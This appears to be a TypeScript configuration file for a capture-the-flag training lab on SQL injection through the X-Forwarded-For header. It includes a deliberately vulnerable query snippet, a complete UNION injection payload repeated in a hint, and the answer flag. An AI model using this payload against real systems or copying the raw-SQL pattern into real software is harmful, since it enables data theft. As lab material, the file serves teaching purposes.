import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab5Metadata: LabMetadata = {
  slug: 'sqli-http-header',
  title: 'SQL Injection: HTTP Header Injection (X-Forwarded-For)',
  ar_title: 'حقن SQL: الحقن عبر HTTP Header',
  description:
    "TrackPro analytics logs every page visit using the visitor's IP from X-Forwarded-For — injected directly into a raw SQL query. Most scanners never check headers.",
  ar_description:
    'منصة TrackPro تسجّل كل زيارة باستخدام IP الزائر من X-Forwarded-For header — يُحقن مباشرة في raw SQL query. معظم الـ scanners لا تفحص الـ headers.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'SQL Injection',
    'HTTP Header Injection',
    'X-Forwarded-For',
    'UNION Attack',
    'Out-of-Band Recon',
  ],
  xpReward: 400,
  pointsReward: 200,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  goal: 'Inject a UNION payload into the X-Forwarded-For header to extract a hidden admin secret from the database.',
  scenario: {
    context:
      'TrackPro is an analytics SaaS. POST /log-visit reads your IP from X-Forwarded-For (standard in cloud ' +
      'environments behind load balancers) and injects it directly into a raw SQL query to fetch visit history. ' +
      "The developer trusted headers as 'server-controlled' — a critical misconception. X-Forwarded-For is freely writable by any HTTP client.",
    vulnerableCode:
      "const ip = req.headers['x-forwarded-for']; // attacker-controlled!\n" +
      'const query = `SELECT action AS ip, type, createdAt FROM "LabGenericLog"\n' +
      "  WHERE userId='...' AND labId='...' AND action = '${ip}'`;",
    exploitation:
      "X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'--\n" +
      "The flag appears in the 'ip' field of the returned visit row.",
  },
  hints: [
    {
      order: 1,
      xpCost: 10,
      content:
        "Try POST /log-visit with X-Forwarded-For: 1.2.3.4 — observe the response. The 'ip' in returned visits = your header value exactly.",
    },
    {
      order: 2,
      xpCost: 20,
      content:
        "Add a single quote: X-Forwarded-For: 1.2.3.4' — if visits returns [] (query broke silently), the header is injected raw.",
    },
    {
      order: 3,
      xpCost: 40,
      content:
        "The response returns 3 columns: ip, type, createdAt. Your UNION must return 3 columns. Target: LabGenericContent with title='admin_secret'.",
    },
    {
      order: 4,
      xpCost: 60,
      content:
        "Full payload: X-Forwarded-For: 1.1.1.1' UNION SELECT body, title, author FROM \"LabGenericContent\" WHERE title='admin_secret'--\nThe flag appears in the 'ip' field.",
    },
  ],

  flagAnswer: 'FLAG{HTTP_HEADER_SQLI_XFF}',
  initialState: {
    contents: [
      {
        title: 'page_meta',
        body: 'Homepage — /index',
        isPublic: true,
        author: 'system',
      },
      {
        title: 'page_meta',
        body: 'Dashboard — /dashboard',
        isPublic: true,
        author: 'system',
      },
      {
        title: 'admin_secret',
        body: 'FLAG{HTTP_HEADER_SQLI_XFF}',
        isPublic: false,
        author: 'admin',
      },
    ],
  },
};
